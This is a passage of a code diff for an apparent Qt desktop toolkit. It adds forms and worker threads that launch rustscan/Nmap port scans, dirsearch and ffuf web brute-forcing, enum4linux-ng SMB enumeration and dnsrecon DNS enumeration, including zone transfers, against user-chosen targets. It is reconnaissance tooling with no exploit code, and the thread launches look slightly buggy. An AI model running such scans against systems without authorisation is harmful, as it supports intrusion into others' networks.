+        controls['nmap_args_edit'].setToolTip("Arguments to pass to Nmap after the port scan (e.g., -sV -A).")
+        layout.addRow("Nmap Args:", controls['nmap_args_edit'])
+
+        controls['quiet_check'] = QCheckBox("Quiet Mode (No Nmap)")
+        controls['quiet_check'].setToolTip("Only output open ports, do not run Nmap (-q).")
+        layout.addRow(controls['quiet_check'])
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['cancel_btn'] = QPushButton("Cancel"); controls['cancel_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_rustscan_scan(self):
+        """Starts the RustScan worker thread."""
+        controls = self.rustscan_controls
+        if not shutil.which("rustscan"):
+            QMessageBox.critical(self, "RustScan Error", "'rustscan' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        targets = controls['targets_edit'].text().strip()
+        if not targets:
+            QMessageBox.critical(self, "Input Error", "Please provide at least one target.")
+            return
+
+        command = ["rustscan", "-a", targets]
+
+        if ports := controls['ports_edit'].text().strip():
+            command.extend(["-p", ports])
+
+        if batch_size := controls['batch_size_edit'].text().strip():
+            command.extend(["-b", batch_size])
+
+        if timeout := controls['timeout_edit'].text().strip():
+            command.extend(["-T", timeout])
+
+        if controls['quiet_check'].isChecked():
+            command.append("-q")
+        else:
+            if nmap_args := controls['nmap_args_edit'].text().strip():
+                command.append("--")
+                command.extend(nmap_args.split())
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['cancel_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.rustscan_output.clear()
+
+        self.worker = WorkerThread(_rustscan_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _rustscan_thread(self, command):
+        """Worker thread for running the rustscan command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting RustScan with command: {' '.join(command)}")
+        q.put(('rustscan_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.rustscan_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('rustscan_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('rustscan_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'RustScan Error', "'rustscan' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"RustScan thread error: {e}", exc_info=True)
+            q.put(('error', 'RustScan Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'rustscan_scan'))
+            with self.thread_finish_lock:
+                self.rustscan_process = None
+            logging.info("RustScan scan thread finished.")
+
+    def _handle_rustscan_output(self, line):
+        self.rustscan_output.insertPlainText(line)
+        self.rustscan_output.verticalScrollBar().setValue(self.rustscan_output.verticalScrollBar().maximum())
+
+    def _create_dirsearch_tool(self):
+        """Creates the UI for the dirsearch tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.dirsearch_controls = self._create_dirsearch_config_widget()
+        main_layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.dirsearch_controls['start_btn'])
+        buttons_layout.addWidget(self.dirsearch_controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.dirsearch_output_console = QPlainTextEdit()
+        self.dirsearch_output_console.setReadOnly(True)
+        self.dirsearch_output_console.setFont(QFont("Courier New", 10))
+        self.dirsearch_output_console.setPlaceholderText("dirsearch output will be displayed here...")
+        main_layout.addWidget(self.dirsearch_output_console, 1)
+
+        self.dirsearch_controls['start_btn'].clicked.connect(self.start_dirsearch_scan)
+        self.dirsearch_controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_dirsearch_config_widget(self):
+        """Creates a reusable, self-contained widget with all of dirsearch's configuration options."""
+        widget = QWidget()
+        main_layout = QFormLayout(widget)
+        controls = {}
+
+        controls['url_edit'] = QLineEdit("http://localhost")
+        controls['url_edit'].setToolTip("The full URL of the target application to scan (-u).")
+        main_layout.addRow("Target URL (-u):", controls['url_edit'])
+
+        wordlist_layout = QHBoxLayout()
+        controls['wordlist_edit'] = QLineEdit()
+        controls['wordlist_edit'].setPlaceholderText("Path to wordlist file (required)...")
+        wordlist_layout.addWidget(controls['wordlist_edit'])
+        browse_wordlist_btn = QPushButton("Browse...")
+        browse_wordlist_btn.clicked.connect(lambda: self._browse_file_for_lineedit(controls['wordlist_edit'], "Select Wordlist File"))
+        wordlist_layout.addWidget(browse_wordlist_btn)
+        main_layout.addRow("Wordlist (-w):", wordlist_layout)
+
+        controls['extensions_edit'] = QLineEdit("php,html,txt")
+        controls['extensions_edit'].setToolTip("Comma-separated list of file extensions to append (-e).")
+        main_layout.addRow("Extensions (-e):", controls['extensions_edit'])
+
+        controls['threads_edit'] = QLineEdit("25")
+        controls['threads_edit'].setToolTip("Number of concurrent threads to use (-t).")
+        main_layout.addRow("Threads (-t):", controls['threads_edit'])
+
+        controls['recursive_check'] = QCheckBox("Recursive Scan")
+        controls['recursive_check'].setToolTip("Enable recursive scanning (-r).")
+        main_layout.addRow(controls['recursive_check'])
+
+        output_file_layout = QHBoxLayout()
+        controls['output_edit'] = QLineEdit()
+        controls['output_edit'].setPlaceholderText("Optional: path to save json report...")
+        output_file_layout.addWidget(controls['output_edit'])
+        browse_output_btn = QPushButton("Browse...")
+        browse_output_btn.clicked.connect(lambda: self._browse_save_file_for_lineedit(controls['output_edit'], "Save dirsearch Report"))
+        output_file_layout.addWidget(browse_output_btn)
+        main_layout.addRow("JSON Report (--json-report):", output_file_layout)
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['stop_btn'] = QPushButton("Stop Scan"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_dirsearch_scan(self):
+        """Starts the dirsearch scan worker thread."""
+        controls = self.dirsearch_controls
+        if not shutil.which("dirsearch"):
+            QMessageBox.critical(self, "dirsearch Error", "'dirsearch' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        url = controls['url_edit'].text().strip()
+        wordlist = controls['wordlist_edit'].text().strip()
+
+        if not url or not wordlist:
+            QMessageBox.critical(self, "Input Error", "Target URL and Wordlist are required.")
+            return
+
+        command = ["dirsearch", "-u", url, "-w", wordlist]
+
+        if extensions := controls['extensions_edit'].text().strip():
+            command.extend(["-e", extensions])
+        if threads := controls['threads_edit'].text().strip():
+            command.extend(["-t", threads])
+        if controls['recursive_check'].isChecked():
+            command.append("-r")
+
+        try:
+            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".json", encoding='utf-8') as tmp_json:
+                self.dirsearch_json_temp_file = tmp_json.name
+            command.extend(["--json-report", self.dirsearch_json_temp_file])
+        except Exception as e:
+            QMessageBox.critical(self, "File Error", f"Could not create temporary file for dirsearch report: {e}")
+            return
+
+        command.append("--no-color")
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.dirsearch_output_console.clear()
+
+        self.worker = WorkerThread(_dirsearch_thread, args=(self, command, url))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _dirsearch_thread(self, command, url):
+        """Worker thread for running the dirsearch command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting dirsearch with command: {' '.join(command)}")
+        q.put(('dirsearch_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.dirsearch_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('dirsearch_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('dirsearch_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+            if not self.tool_stop_event.is_set():
+                try:
+                    with open(self.dirsearch_json_temp_file, 'r', encoding='utf-8') as f:
+                        json_data = f.read()
+                    if json_data:
+                        q.put(('dirsearch_results', json_data, url))
+                except Exception as e:
+                    logging.error(f"Could not read dirsearch JSON report: {e}")
+                finally:
+                    os.remove(self.dirsearch_json_temp_file)
+                    self.dirsearch_json_temp_file = None
+
+        except FileNotFoundError:
+            q.put(('error', 'dirsearch Error', "'dirsearch' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"dirsearch thread error: {e}", exc_info=True)
+            q.put(('error', 'dirsearch Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'dirsearch_scan'))
+            with self.thread_finish_lock:
+                self.dirsearch_process = None
+            logging.info("dirsearch scan thread finished.")
+
+    def _handle_dirsearch_output(self, line):
+        self.dirsearch_output_console.insertPlainText(line)
+        self.dirsearch_output_console.verticalScrollBar().setValue(self.dirsearch_output_console.verticalScrollBar().maximum())
+
+    def _create_ffuf_tool(self):
+        """Creates the UI for the ffuf tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.ffuf_controls = self._create_ffuf_config_widget()
+        main_layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.ffuf_controls['start_btn'])
+        buttons_layout.addWidget(self.ffuf_controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.ffuf_output_console = QPlainTextEdit()
+        self.ffuf_output_console.setReadOnly(True)
+        self.ffuf_output_console.setFont(QFont("Courier New", 10))
+        self.ffuf_output_console.setPlaceholderText("ffuf output will be displayed here...")
+        main_layout.addWidget(self.ffuf_output_console, 1)
+
+        self.ffuf_controls['start_btn'].clicked.connect(self.start_ffuf_scan)
+        self.ffuf_controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_ffuf_config_widget(self):
+        """Creates a reusable, self-contained widget with all of ffuf's configuration options."""
+        widget = QWidget()
+        main_layout = QFormLayout(widget)
+        controls = {}
+
+        controls['url_edit'] = QLineEdit("http://localhost/FUZZ")
+        controls['url_edit'].setToolTip("The full URL to fuzz. Must contain the 'FUZZ' keyword.")
+        main_layout.addRow("Target URL (-u):", controls['url_edit'])
+
+        wordlist_layout = QHBoxLayout()
+        controls['wordlist_edit'] = QLineEdit()
+        controls['wordlist_edit'].setPlaceholderText("Path to wordlist file (required)...")
+        wordlist_layout.addWidget(controls['wordlist_edit'])
+        browse_wordlist_btn = QPushButton("Browse...")
+        browse_wordlist_btn.clicked.connect(lambda: self._browse_file_for_lineedit(controls['wordlist_edit'], "Select Wordlist File"))
+        wordlist_layout.addWidget(browse_wordlist_btn)
+        main_layout.addRow("Wordlist (-w):", wordlist_layout)
+
+        controls['extensions_edit'] = QLineEdit(".php,.html,.txt")
+        controls['extensions_edit'].setToolTip("Comma-separated list of file extensions to append (-e).")
+        main_layout.addRow("Extensions (-e):", controls['extensions_edit'])
+
+        controls['threads_edit'] = QLineEdit("40")
+        controls['threads_edit'].setToolTip("Number of concurrent threads to use (-t).")
+        main_layout.addRow("Threads (-t):", controls['threads_edit'])
+
+        controls['method_edit'] = QLineEdit("GET")
+        controls['method_edit'].setToolTip("HTTP method to use (-X).")
+        main_layout.addRow("HTTP Method (-X):", controls['method_edit'])
+
+        controls['match_codes_edit'] = QLineEdit("200,204,301,302,307,401,403,405")
+        controls['match_codes_edit'].setToolTip("Match HTTP status codes (-mc).")
+        main_layout.addRow("Match Codes (-mc):", controls['match_codes_edit'])
+
+        controls['filter_codes_edit'] = QLineEdit("404")
+        controls['filter_codes_edit'].setToolTip("Filter HTTP status codes (-fc).")
+        main_layout.addRow("Filter Codes (-fc):", controls['filter_codes_edit'])
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['stop_btn'] = QPushButton("Stop Scan"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_ffuf_scan(self):
+        """Starts the ffuf scan worker thread."""
+        controls = self.ffuf_controls
+        if not shutil.which("ffuf"):
+            QMessageBox.critical(self, "ffuf Error", "'ffuf' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        url = controls['url_edit'].text().strip()
+        wordlist = controls['wordlist_edit'].text().strip()
+
+        if not url or not wordlist:
+            QMessageBox.critical(self, "Input Error", "Target URL and Wordlist are required.")
+            return
+
+        if "FUZZ" not in url:
+            QMessageBox.critical(self, "Input Error", "Target URL must contain the 'FUZZ' keyword.")
+            return
+
+        command = ["ffuf", "-u", url, "-w", wordlist]
+
+        if extensions := controls['extensions_edit'].text().strip():
+            command.extend(["-e", extensions])
+        if threads := controls['threads_edit'].text().strip():
+            command.extend(["-t", threads])
+        if method := controls['method_edit'].text().strip():
+            command.extend(["-X", method])
+        if mc := controls['match_codes_edit'].text().strip():
+            command.extend(["-mc", mc])
+        if fc := controls['filter_codes_edit'].text().strip():
+            command.extend(["-fc", fc])
+
+        try:
+            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".json", encoding='utf-8') as tmp_json:
+                self.ffuf_json_temp_file = tmp_json.name
+            command.extend(["-o", self.ffuf_json_temp_file, "-of", "json"])
+        except Exception as e:
+            QMessageBox.critical(self, "File Error", f"Could not create temporary file for ffuf report: {e}")
+            return
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.ffuf_output_console.clear()
+
+        self.worker = WorkerThread(_ffuf_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _ffuf_thread(self, command):
+        """Worker thread for running the ffuf command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting ffuf with command: {' '.join(command)}")
+        q.put(('ffuf_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            # We need to capture stderr because ffuf prints progress there
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.ffuf_process = process
+
+            # Non-blocking read from stderr for progress
+            def read_stderr():
+                for line in iter(process.stderr.readline, ''):
+                    q.put(('ffuf_output', line))
+
+            stderr_thread = threading.Thread(target=read_stderr)
+            stderr_thread.daemon = True
+            stderr_thread.start()
+
+            # Wait for the process to finish
+            process.wait()
+            stderr_thread.join(timeout=1)
+
+            if not self.tool_stop_event.is_set():
+                try:
+                    with open(self.ffuf_json_temp_file, 'r', encoding='utf-8') as f:
+                        json_data = f.read()
+                    if json_data:
+                        q.put(('ffuf_results', json_data))
+                except Exception as e:
+                    logging.error(f"Could not read ffuf JSON report: {e}")
+                finally:
+                    os.remove(self.ffuf_json_temp_file)
+                    self.ffuf_json_temp_file = None
+
+
+        except FileNotFoundError:
+            q.put(('error', 'ffuf Error', "'ffuf' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"ffuf thread error: {e}", exc_info=True)
+            q.put(('error', 'ffuf Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'ffuf_scan'))
+            with self.thread_finish_lock:
+                self.ffuf_process = None
+            logging.info("ffuf scan thread finished.")
+
+    def _handle_ffuf_output(self, line):
+        self.ffuf_output_console.insertPlainText(line)
+        self.ffuf_output_console.verticalScrollBar().setValue(self.ffuf_output_console.verticalScrollBar().maximum())
+
+    def _create_enum4linux_ng_tool(self):
+        """Creates the UI for the enum4linux-ng tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.enum4linux_ng_controls = self._create_enum4linux_ng_config_widget()
+        main_layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.enum4linux_ng_controls['start_btn'])
+        buttons_layout.addWidget(self.enum4linux_ng_controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.enum4linux_ng_output_console = QPlainTextEdit()
+        self.enum4linux_ng_output_console.setReadOnly(True)
+        self.enum4linux_ng_output_console.setFont(QFont("Courier New", 10))
+        self.enum4linux_ng_output_console.setPlaceholderText("enum4linux-ng output will be displayed here...")
+        main_layout.addWidget(self.enum4linux_ng_output_console, 1)
+
+        self.enum4linux_ng_controls['start_btn'].clicked.connect(self.start_enum4linux_ng_scan)
+        self.enum4linux_ng_controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_enum4linux_ng_config_widget(self):
+        """Creates a reusable, self-contained widget with enum4linux-ng's configuration options."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+        controls = {}
+
+        # --- Target and Auth ---
+        top_box = QGroupBox("Target & Authentication")
+        top_layout = QFormLayout(top_box)
+        controls['target_edit'] = QLineEdit()
+        top_layout.addRow("Target Host:", controls['target_edit'])
+        controls['user_edit'] = QLineEdit()
+        top_layout.addRow("Username (-u):", controls['user_edit'])
+        controls['pass_edit'] = QLineEdit(); controls['pass_edit'].setEchoMode(QLineEdit.EchoMode.Password)
+        top_layout.addRow("Password (-p):", controls['pass_edit'])
+        main_layout.addWidget(top_box)
+
+        # --- Enumeration Options ---
+        enum_box = QGroupBox("Enumeration Options")
+        enum_layout = QGridLayout(enum_box)
+        controls['all_check'] = QCheckBox("All Simple Enum (-A)"); controls['all_check'].setChecked(True)
+        controls['users_check'] = QCheckBox("Users (-U)")
+        controls['groups_check'] = QCheckBox("Groups (-G)")
+        controls['shares_check'] = QCheckBox("Shares (-S)")
+        controls['policy_check'] = QCheckBox("Password Policy (-P)")
+        controls['os_check'] = QCheckBox("OS Info (-O)")
+        enum_layout.addWidget(controls['all_check'], 0, 0)
+        enum_layout.addWidget(controls['users_check'], 1, 0)
+        enum_layout.addWidget(controls['groups_check'], 1, 1)
+        enum_layout.addWidget(controls['shares_check'], 2, 0)
+        enum_layout.addWidget(controls['policy_check'], 2, 1)
+        enum_layout.addWidget(controls['os_check'], 3, 0)
+        main_layout.addWidget(enum_box)
+
+        # --- UI Logic ---
+        def toggle_enum_options(checked):
+            for key in ['users_check', 'groups_check', 'shares_check', 'policy_check', 'os_check']:
+                controls[key].setDisabled(checked)
+        controls['all_check'].toggled.connect(toggle_enum_options)
+        toggle_enum_options(True)
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['stop_btn'] = QPushButton("Stop Scan"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_enum4linux_ng_scan(self):
+        """Starts the enum4linux-ng scan worker thread."""
+        controls = self.enum4linux_ng_controls
+        if not shutil.which("enum4linux-ng"):
+            QMessageBox.critical(self, "enum4linux-ng Error", "'enum4linux-ng' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        target = controls['target_edit'].text().strip()
+        if not target:
+            QMessageBox.critical(self, "Input Error", "A target host is required.")
+            return
+
+        command = ["enum4linux-ng"]
+
+        if controls['all_check'].isChecked():
+            command.append("-A")
+        else:
+            if controls['users_check'].isChecked(): command.append("-U")
+            if controls['groups_check'].isChecked(): command.append("-G")
+            if controls['shares_check'].isChecked(): command.append("-S")
+            if controls['policy_check'].isChecked(): command.append("-P")
+            if controls['os_check'].isChecked(): command.append("-O")
+
+        if user := controls['user_edit'].text().strip():
+            command.extend(["-u", user])
+        if pwd := controls['pass_edit'].text().strip():
+            command.extend(["-p", pwd])
+
+        try:
+            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".json", encoding='utf-8') as tmp_json:
+                self.enum4linux_ng_json_temp_file = tmp_json.name
+            command.extend(["-oJ", self.enum4linux_ng_json_temp_file])
+        except Exception as e:
+            QMessageBox.critical(self, "File Error", f"Could not create temporary file for enum4linux-ng report: {e}")
+            return
+
+        command.append(target)
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.enum4linux_ng_output_console.clear()
+
+        self.worker = WorkerThread(_enum4linux_ng_thread, args=(self, command, target))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _enum4linux_ng_thread(self, command, target):
+        """Worker thread for running the enum4linux-ng command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting enum4linux-ng with command: {' '.join(command)}")
+        q.put(('enum4linux_ng_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                q.put(('error', 'Platform Error', 'enum4linux-ng is not supported on Windows.'))
+                q.put(('tool_finished', 'enum4linux_ng_scan'))
+                return
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.enum4linux_ng_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('enum4linux_ng_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('enum4linux_ng_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+            if not self.tool_stop_event.is_set():
+                try:
+                    with open(self.enum4linux_ng_json_temp_file, 'r', encoding='utf-8') as f:
+                        json_data = f.read()
+                    if json_data:
+                        q.put(('enum4linux_ng_results', json_data, target))
+                except Exception as e:
+                    logging.error(f"Could not read enum4linux-ng JSON report: {e}")
+                finally:
+                    os.remove(self.enum4linux_ng_json_temp_file)
+                    self.enum4linux_ng_json_temp_file = None
+
+        except FileNotFoundError:
+            q.put(('error', 'enum4linux-ng Error', "'enum4linux-ng' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"enum4linux-ng thread error: {e}", exc_info=True)
+            q.put(('error', 'enum4linux-ng Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'enum4linux_ng_scan'))
+            with self.thread_finish_lock:
+                self.enum4linux_ng_process = None
+            logging.info("enum4linux-ng scan thread finished.")
+
+    def _handle_enum4linux_ng_output(self, line):
+        self.enum4linux_ng_output_console.insertPlainText(line)
+        self.enum4linux_ng_output_console.verticalScrollBar().setValue(self.enum4linux_ng_output_console.verticalScrollBar().maximum())
+
+    def _create_dnsrecon_tool(self):
+        """Creates the UI for the dnsrecon tool."""
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        config_widget, self.dnsrecon_controls = self._create_dnsrecon_config_widget()
+        main_layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.dnsrecon_controls['start_btn'])
+        buttons_layout.addWidget(self.dnsrecon_controls['stop_btn'])
+        main_layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.dnsrecon_output_console = QPlainTextEdit()
+        self.dnsrecon_output_console.setReadOnly(True)
+        self.dnsrecon_output_console.setFont(QFont("Courier New", 10))
+        self.dnsrecon_output_console.setPlaceholderText("dnsrecon output will be displayed here...")
+        main_layout.addWidget(self.dnsrecon_output_console, 1)
+
+        self.dnsrecon_controls['start_btn'].clicked.connect(self.start_dnsrecon_scan)
+        self.dnsrecon_controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_dnsrecon_config_widget(self):
+        """Creates a reusable, self-contained widget with dnsrecon's configuration options."""
+        widget = QWidget()
+        main_layout = QFormLayout(widget)
+        controls = {}
+
+        controls['domain_edit'] = QLineEdit("example.com")
+        main_layout.addRow("Domain (-d):", controls['domain_edit'])
+
+        controls['scan_type_combo'] = QComboBox()
+        controls['scan_type_combo'].addItems(["std", "axfr", "brt", "srv", "zonewalk"])
+        controls['scan_type_combo'].setToolTip("Select the enumeration type (-t).")
+        main_layout.addRow("Scan Type (-t):", controls['scan_type_combo'])
+
+        wordlist_layout = QHBoxLayout()
+        controls['dict_edit'] = QLineEdit()
+        controls['dict_edit'].setPlaceholderText("Path to wordlist for 'brt' scan...")
+        wordlist_layout.addWidget(controls['dict_edit'])
+        browse_dict_btn = QPushButton("Browse...")
+        browse_dict_btn.clicked.connect(lambda: self._browse_file_for_lineedit(controls['dict_edit'], "Select Dictionary File"))
+        wordlist_layout.addWidget(browse_dict_btn)
+        main_layout.addRow("Dictionary (-D):", wordlist_layout)
+
+        controls['json_output_edit'] = QLineEdit()
+        controls['json_output_edit'].setPlaceholderText("Optional: path to save JSON report...")
+        main_layout.addRow("JSON Output (--json):", controls['json_output_edit'])
+
+        # UI Logic
+        def toggle_dict_visibility(text):
+            controls['dict_edit'].setVisible(text == 'brt')
+            browse_dict_btn.setVisible(text == 'brt')
+            # Also find and hide the label
+            label = main_layout.labelForField(wordlist_layout)
+            if label: label.setVisible(text == 'brt')
+
+        controls['scan_type_combo'].currentTextChanged.connect(toggle_dict_visibility)
+        toggle_dict_visibility(controls['scan_type_combo'].currentText())
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['stop_btn'] = QPushButton("Stop Scan"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_dnsrecon_scan(self):
+        """Starts the dnsrecon scan worker thread."""
+        controls = self.dnsrecon_controls
+        if not shutil.which("dnsrecon"):
+            QMessageBox.critical(self, "dnsrecon Error", "'dnsrecon' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        domain = controls['domain_edit'].text().strip()
+        if not domain:
+            QMessageBox.critical(self, "Input Error", "A domain is required.")
+            return
+
+        command = ["dnsrecon", "-d", domain]
+
+        scan_type = controls['scan_type_combo'].currentText()
+        command.extend(["-t", scan_type])
+
+        if scan_type == 'brt':
+            if dictionary := controls['dict_edit'].text().strip():
+                command.extend(["-D", dictionary])
+            else:
+                QMessageBox.warning(self, "Input Warning", "Brute-force scan selected but no dictionary file was provided. Using default wordlist.")
+
+        try:
+            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".json", encoding='utf-8') as tmp_json:
+                self.dnsrecon_json_temp_file = tmp_json.name
+            command.extend(["--json", self.dnsrecon_json_temp_file])
+        except Exception as e:
+            QMessageBox.critical(self, "File Error", f"Could not create temporary file for dnsrecon report: {e}")
+            return
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.dnsrecon_output_console.clear()
+
+        self.worker = WorkerThread(_dnsrecon_thread, args=(self, command, domain))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _dnsrecon_thread(self, command, domain):
+        """Worker thread for running the dnsrecon command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting dnsrecon with command: {' '.join(command)}")
+        q.put(('dnsrecon_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                startupinfo = subprocess.STARTUPINFO()
+                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.dnsrecon_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('dnsrecon_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('dnsrecon_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+            if not self.tool_stop_event.is_set():
+                try:
+                    with open(self.dnsrecon_json_temp_file, 'r', encoding='utf-8') as f:
+                        json_data = f.read()
+                    if json_data:
+                        q.put(('dnsrecon_results', json_data, domain))
+                except Exception as e:
+                    logging.error(f"Could not read dnsrecon JSON report: {e}")
+                finally:
+                    os.remove(self.dnsrecon_json_temp_file)
+                    self.dnsrecon_json_temp_file = None
+
+        except FileNotFoundError:
+            q.put(('error', 'dnsrecon Error', "'dnsrecon' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"dnsrecon thread error: {e}", exc_info=True)
+            q.put(('error', 'dnsrecon Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'dnsrecon_scan'))
+            with self.thread_finish_lock:
+                self.dnsrecon_process = None
+            logging.info("dnsrecon scan thread finished.")
+
+    def _handle_dnsrecon_output(self, line):
+        self.dnsrecon_output_console.insertPlainText(line)
+        self.dnsrecon_output_console.verticalScrollBar().setValue(self.dnsrecon_output_console.verticalScrollBar().maximum())
+
